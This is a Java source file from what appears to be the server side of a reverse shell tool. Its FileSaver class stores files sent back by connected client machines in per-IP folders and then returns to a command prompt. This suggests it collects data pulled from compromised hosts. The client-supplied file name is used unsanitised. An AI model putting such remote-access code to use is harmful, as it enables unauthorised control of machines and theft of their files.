package obs1d1anc1ph3r.reverseshell.server;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

public class FileSaver {

	public void saveFile(byte[] fileBytes, Socket clientSocket, String fileName) {
		try {
			String clientIP = clientSocket.getInetAddress().toString().replace("/", "");
			Path saveDir = Paths.get(clientIP);
			if (Files.notExists(saveDir)) {
				Files.createDirectories(saveDir);
				System.out.println("[INFO] Created directory for client: " + saveDir.toAbsolutePath());
			}

			File downloadedFile = new File(saveDir.toFile(), fileName);
			try (FileOutputStream fos = new FileOutputStream(downloadedFile)) {
				fos.write(fileBytes);
			}
			System.out.println("[INFO] File saved at: " + downloadedFile.getAbsolutePath());
			System.out.print("[-] Command> ");
		} catch (IOException ex) {
			System.err.println("[ERROR] Error saving file: " + ex.getMessage());
		}
	}
}
